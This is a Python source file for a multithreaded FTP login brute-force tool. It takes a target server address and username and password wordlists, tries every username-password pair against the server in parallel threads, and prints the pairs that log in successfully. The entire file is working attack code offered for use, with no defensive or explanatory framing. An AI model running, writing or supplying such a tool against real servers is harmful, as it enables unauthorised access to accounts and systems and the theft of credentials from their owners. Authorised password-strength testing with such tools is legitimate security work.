import ftplib
import argparse
import threading
import queue
import pyfiglet
from itertools import product

asciiBanner = pyfiglet.figlet_format("FTP Brute Force")
print(asciiBanner)

def parse_args():
    parser = argparse.ArgumentParser(description="Simple FTP Login Bruteforce")
    parser.add_argument('-u', '--url', help='FTP server address', required=True)
    parser.add_argument('--user', help='Usernames wordlist file', required=True)
    parser.add_argument('--password', help='Passwords wordlist file', required=True)
    parser.add_argument('--threads', help='Number of concurrent threads', default=5, type=int)
    return parser.parse_args()

def bruteForce(host, cred_queue, lock):
    while not cred_queue.empty():
        try:
            username, password = cred_queue.get_nowait()
        except queue.Empty:
            return
        ## FTP Brute Force
        try:
            ftp = ftplib.FTP(host, timeout=5)
            ftp.login(username, password)
            with lock:
                print(f"[SUCCESS] Username: '{username}' Password: '{password}'")
            ftp.quit()
        except Exception as e:
            with lock:
                print(f"[ERROR] Username: '{username}' Password: '{password}' - Unexpected error: {e}")
        finally:
            cred_queue.task_done()

def main():
    args = parse_args()
    host = args.url
    num_threads = args.threads

    try:
        with open(args.user, 'r') as f:
            usernames = f.read().splitlines()
        with open(args.password, 'r') as f:
            passwords = f.read().splitlines()
    except Exception as e:
        print(f"[ERROR] Reading wordlist files failed: {e}")
        return

    cred_queue = queue.Queue()
    for cred in product(usernames, passwords):
        cred_queue.put(cred)

    lock = threading.Lock()
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=bruteForce, args=(host, cred_queue, lock))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
